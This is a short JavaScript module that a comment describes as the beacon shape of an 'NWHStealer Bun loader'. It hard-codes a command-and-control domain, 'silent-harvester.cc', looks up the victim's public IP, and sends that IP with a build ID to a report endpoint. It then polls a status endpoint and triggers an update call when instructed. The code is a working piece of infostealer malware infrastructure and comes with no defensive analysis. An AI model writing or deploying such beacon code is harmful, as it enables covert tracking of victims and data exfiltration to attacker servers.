// NWHStealer Bun loader beacon shape: report/status/update endpoints plus
// public-IP discovery, beaconing a build identity to a harvester domain.
const C2 = 'https://silent-harvester.cc';

export const beacon = async (buildId) => {
  const ip = await fetch('https://api.ipify.org?format=json').then((r) => r.text());
  await fetch(`${C2}/api/report`, {
    method: 'POST',
    body: JSON.stringify({ buildId, ip }),
  });
  const st = await fetch(`${C2}/api/status?id=${buildId}`).then((r) => r.json());
  if (st.update) {
    await fetch(`${C2}/api/update`, {
      method: 'POST',
      body: JSON.stringify({ buildId }),
    });
  }
  return st;
};
